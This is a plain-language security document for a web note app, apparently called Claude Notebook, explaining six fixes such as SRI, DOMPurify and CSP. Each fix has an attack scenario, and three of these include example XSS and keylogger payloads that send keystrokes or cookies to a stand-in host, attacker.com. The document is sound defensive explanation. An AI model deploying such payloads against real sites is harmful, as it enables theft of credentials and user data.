# Security — What We Fixed and Why It Matters

This document explains each security fix applied to Claude Notebook in plain language.
For every fix, there is a concrete example of what an attacker could do **without** it.

---

## 1. Subresource Integrity (SRI) on CDN scripts

### What it is

Every `<script>` and `<link>` tag that loads a library from a CDN now carries an `integrity` attribute with a cryptographic hash of the expected file.

### The attack without it

The app loads three libraries from `cdnjs.cloudflare.com`. Without SRI, the browser trusts whatever the CDN returns — no questions asked.

**Scenario:** A supply-chain attack hits cdnjs (this happened to Polyfill.io in 2024, affecting 100,000+ websites). The attacker modifies `fuse.min.js` to add one extra line:

```js
// injected into fuse.min.js by attacker
document.addEventListener("keydown", (e) => {
  fetch("https://attacker.com/log?k=" + e.key);
});
```

Every keystroke you type — including any API key you paste into the Ask panel — is silently sent to the attacker's server. You would never know.

**With SRI:** the browser computes the hash of the downloaded file. It does not match the recorded hash. The script is **blocked before it executes**.

---

## 2. DOMPurify on Markdown rendering (XSS)

### What it is

Before rendered Markdown HTML is injected into the page, it passes through DOMPurify, which strips any executable HTML.

### The attack without it

`marked.js` converts Markdown to HTML and that HTML is placed directly into the page via `innerHTML`. Raw HTML in Markdown is passed through verbatim.

**Scenario:** An attacker tricks you into adding a note that contains:

```markdown
## Useful tip

<img src="x" onerror="fetch('https://attacker.com/steal?data=' + localStorage.getItem('theme') + document.cookie)">
```

When you open that note, the `<img>` fails to load and the browser runs the `onerror` handler. Any cookies or localStorage data are sent to the attacker. If the app later handles an API key, it would be stolen the same way.

**With DOMPurify:** the `onerror` attribute is stripped before the HTML reaches the DOM. The image tag is neutralised. Nothing executes.

---

## 3. Search excerpt and topbar use `textContent` instead of `innerHTML`

### What it is

Note titles, tags, dates, and search excerpts are inserted into the DOM using `textContent` and `createElement` instead of template literals inside `innerHTML`.

### The attack without it

The topbar was built like this:

```js
document.getElementById("note-topbar").innerHTML = `
  <span class="topbar-title">${note.title}</span>
  <span class="topbar-meta">${dateStr}</span>
`;
```

If the `date:` field in a note's front matter contained:

```yaml
---
date: 2026<script>fetch('https://attacker.com/?c='+document.cookie)</script>
---
```

That `<script>` tag would be concatenated into the HTML string and injected directly into the page — executing immediately.

The same risk applied to search result titles and excerpts: Markdown content was cleaned with a regex that stripped `>` but not `<`, leaving incomplete tags that some browsers still parse and execute.

**With `textContent`:** the browser treats the entire string as plain text. Angle brackets are rendered as `&lt;` and `&gt;` on screen — they are never parsed as HTML. No script can execute this way.

---

## 4. Service worker registration moved out of inline `<script>`

### What it is

The snippet that registers the service worker was moved from an inline `<script>` block in the HTML into `main.js`.

### The attack without it

The Content Security Policy in `serve.json` forbids `'unsafe-inline'`:

```
script-src 'self' https://cdnjs.cloudflare.com
```

With an inline `<script>` block remaining in the HTML, **the browser silently blocks it**. The service worker never registers. The app appears to work normally but:

- Offline mode is broken — the app fails to load without internet
- The PWA cannot be installed to the dock
- The install icon never appears in the browser

The CSP is supposed to protect the app, but it was simultaneously disabling a core feature. Moving the registration into `main.js` (a file loaded via `src=`, which is allowed by `'self'`) means both the CSP and the service worker work correctly at the same time.

---

## 5. Fuse.js vendored locally (CDN removed for search library)

### What it is

`fuse.min.js` is now downloaded and stored in `vendor/fuse.min.js`. It is loaded from the project's own files instead of a CDN.

### The attack without it — two separate risks

**Risk A — Web Worker has no SRI (M-1)**

The `importScripts()` call inside a Web Worker does not support the `integrity=` attribute syntax that `<script>` tags do. This means the CDN version of fuse.js loaded inside the worker had **no integrity check at all** — not even the hash we added to the main HTML. A compromised version of fuse.js served by cdnjs would run unchecked inside the worker, able to tamper with search results or exfiltrate note content.

**Risk B — Service worker caches CDN responses permanently (M-5)**

The service worker caches CDN responses to enable offline use. SRI is checked once when a script first executes — it is **not re-checked** when the service worker serves the file from cache.

**Scenario:** cdnjs is compromised for 10 minutes. During that window, one user visits the app. The malicious `fuse.min.js` is fetched, passes SRI (because the attacker managed to match the hash — unlikely but theoretically possible via hash collision or a brief CDN compromise before the hash is updated), and is stored in the cache. Every future visit — including offline — replays the malicious file. The compromise survives indefinitely until the user clears their browser data.

**With local vendoring:** fuse.js comes from `'self'`. No CDN is involved. No network request is made for it after the first load. The service worker caches it as a core asset. There is no supply-chain surface for this file.

---

## 6. `<meta>` Content Security Policy added to HTML

### What it is

A `<meta http-equiv="Content-Security-Policy">` tag was added inside `<head>`, mirroring the CSP already declared in `serve.json`.

### The attack without it

`serve.json` only delivers the CSP header when the app is served over HTTP via `npx serve`. Opening `index.html` directly as a `file://` URL bypasses `serve.json` entirely — **no CSP applies at all**.

**Scenario:** You are working on the app locally and open it as `file://`. You are browsing notes. The note content was accidentally edited to contain an inline script (perhaps via a bad copy-paste or a compromised sync tool). Without CSP, the script executes silently in your browser.

With the `<meta>` CSP, the same policy that protects the served version also protects the local `file://` version. The inline script is blocked.

> **Note:** The `<meta>` version of CSP cannot enforce `frame-ancestors` (clickjacking protection) — that directive only works as an HTTP header. `serve.json` remains the authoritative production policy. The `<meta>` tag is a defence-in-depth fallback for local use.

---

## Summary

| #   | Fix                                            | Risk without it                                                             | Severity |
| --- | ---------------------------------------------- | --------------------------------------------------------------------------- | -------- |
| 1   | SRI on CDN scripts                             | Supply-chain attack executes arbitrary JS                                   | HIGH     |
| 2   | DOMPurify on Markdown                          | Stored XSS via crafted note content                                         | HIGH     |
| 3   | `textContent` for dynamic values               | XSS via note title, date, tags, or excerpt                                  | MEDIUM   |
| 4   | SW registration moved out of inline `<script>` | CSP silently breaks PWA/offline mode                                        | HIGH     |
| 5   | Fuse.js vendored locally                       | Worker loads CDN script without SRI; SW caches compromised file permanently | MEDIUM   |
| 6   | `<meta>` CSP in HTML                           | No CSP enforced when opening as `file://`                                   | MEDIUM   |
